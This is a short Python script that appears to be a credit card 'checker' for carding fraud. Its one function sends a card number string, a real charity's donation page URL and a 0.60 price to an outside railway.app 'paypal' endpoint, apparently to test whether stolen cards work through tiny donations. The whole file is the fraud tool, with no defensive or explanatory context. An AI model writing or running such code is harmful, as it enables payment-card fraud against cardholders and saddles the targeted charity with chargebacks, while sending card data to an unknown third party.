import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://arukahhouse.net/donate/"
	price="0.60"
	res=requests.get(f'http://pqy2-production.up.railway.app/paypal?cc={cc}&url={urll}&price={price}').text
	return res
